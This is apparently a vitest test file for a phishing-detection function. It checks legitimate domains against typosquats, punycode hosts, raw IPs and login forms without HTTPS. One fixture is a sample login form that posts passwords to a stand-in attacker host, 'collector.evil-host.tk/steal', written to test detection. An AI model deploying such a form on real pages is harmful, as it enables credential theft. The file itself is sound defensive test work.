/**
 * The phishing verdict is the feature non-technical users act on, so both
 * directions matter: it must catch real impersonation, and it must not cry wolf
 * on legitimate sites. The false-positive cases are as important as the hits.
 */

import { describe, it, expect } from 'vitest';
import { assessPhishing } from '@/lib/scanner/phishing';
import type { SslCertificate } from '@/types/scanner';

const validCert = (issuedDaysAgo = 200): SslCertificate => ({
  status: 'valid',
  grade: 'A',
  subject: 'CN=example',
  issuer: "Let's Encrypt",
  validFrom: new Date(Date.now() - issuedDaysAgo * 86_400_000).toISOString(),
  validTo: new Date(Date.now() + 60 * 86_400_000).toISOString(),
  daysRemaining: 60,
  algorithm: 'RSA',
  keySize: 2048,
  chain: [],
  fingerprint: 'aa:bb',
  validated: true,
  selfSigned: false,
  hostnameMatch: true,
} as SslCertificate);

function assess(over: Partial<Parameters<typeof assessPhishing>[0]> = {}) {
  return assessPhishing({
    hostname: 'example.com',
    finalUrl: 'https://example.com/',
    html: '<html><head><title>Example</title></head><body>Hello</body></html>',
    isHttps: true,
    cert: validCert(),
    hasLoginForm: false,
    ...over,
  });
}

describe('legitimate sites are not flagged', () => {
  it('clears a brand on its own official domain', () => {
    const result = assess({ hostname: 'paypal.com', finalUrl: 'https://paypal.com/' });
    expect(result.verdict).toBe('looks_original');
    expect(result.riskScore).toBe(0);
  });

  it('clears an ordinary unrelated site', () => {
    const result = assess({ hostname: 'some-small-business.com', finalUrl: 'https://some-small-business.com/' });
    expect(result.verdict).toBe('looks_original');
  });

  it('does not flag a legitimate subdomain of a brand', () => {
    const result = assess({ hostname: 'accounts.google.com', finalUrl: 'https://accounts.google.com/' });
    expect(result.verdict).toBe('looks_original');
  });

  it('does not flag a freshly renewed certificate on its own', () => {
    // Automated renewal means honest sites routinely have days-old certs.
    const result = assess({ cert: validCert(1), hasLoginForm: true });
    expect(result.verdict).toBe('looks_original');
  });
});

describe('impersonation is caught', () => {
  it('catches digit-for-letter typosquats', () => {
    const result = assess({ hostname: 'paypa1.com', finalUrl: 'https://paypa1.com/' });
    expect(result.verdict).toBe('likely_spoofed');
    expect(result.matchedBrand).toBe('paypal');
  });

  it('catches near-miss misspellings', () => {
    const result = assess({ hostname: 'micorsoft.com', finalUrl: 'https://micorsoft.com/' });
    expect(result.riskScore).toBeGreaterThan(20);
  });

  it('catches a brand name embedded in an unrelated domain', () => {
    const result = assess({ hostname: 'paypal-secure-login.info', finalUrl: 'https://paypal-secure-login.info/' });
    expect(result.verdict).toBe('likely_spoofed');
  });

  it('flags punycode domains', () => {
    const result = assess({ hostname: 'xn--pypal-4ve.com', finalUrl: 'https://xn--pypal-4ve.com/' });
    expect(result.signals.some((s) => /international characters/i.test(s.label))).toBe(true);
  });

  it('flags a bare IP address', () => {
    const result = assess({ hostname: '203.0.113.45', finalUrl: 'http://203.0.113.45/', isHttps: false });
    expect(result.signals.some((s) => /raw IP/i.test(s.label))).toBe(true);
  });

  it('flags a password form with no HTTPS at all', () => {
    const result = assess({ isHttps: false, cert: undefined, hasLoginForm: true });
    expect(result.signals.some((s) => /no encryption/i.test(s.label))).toBe(true);
  });
});

describe('credential exfiltration to another domain', () => {
  it('flags a login form posting to an unrelated host', () => {
    const result = assess({
      hasLoginForm: true,
      html: '<form action="https://collector.evil-host.tk/steal" method="post"><input type="password"></form>',
    });
    expect(result.signals.some((s) => /different website/i.test(s.label))).toBe(true);
    expect(result.verdict).toBe('likely_spoofed');
  });

  it('does not flag a form posting back to its own site', () => {
    const result = assess({
      hasLoginForm: true,
      html: '<form action="/login" method="post"><input type="password"></form>',
    });
    expect(result.signals.some((s) => /different website/i.test(s.label))).toBe(false);
  });

  it('does not flag hosted single sign-on', () => {
    const result = assess({
      hasLoginForm: true,
      html: '<form action="https://accounts.google.com/signin" method="post"><input type="password"></form>',
    });
    expect(result.signals.some((s) => /different website/i.test(s.label))).toBe(false);
  });
});

describe('assessment shape', () => {
  it('always explains itself and keeps the score in range', () => {
    for (const host of ['paypal.com', 'paypa1.com', 'random.xyz']) {
      const result = assess({ hostname: host, finalUrl: `https://${host}/` });
      expect(result.signals.length, host).toBeGreaterThan(0);
      expect(result.riskScore).toBeGreaterThanOrEqual(0);
      expect(result.riskScore).toBeLessThanOrEqual(100);
      expect(result.disclaimer).toBeTruthy();
      expect(result.headline).toBeTruthy();
    }
  });

  it('never throws on malformed html', () => {
    expect(() => assess({ html: '<form action="::::not a url"><input type="password">', hasLoginForm: true })).not.toThrow();
  });
});
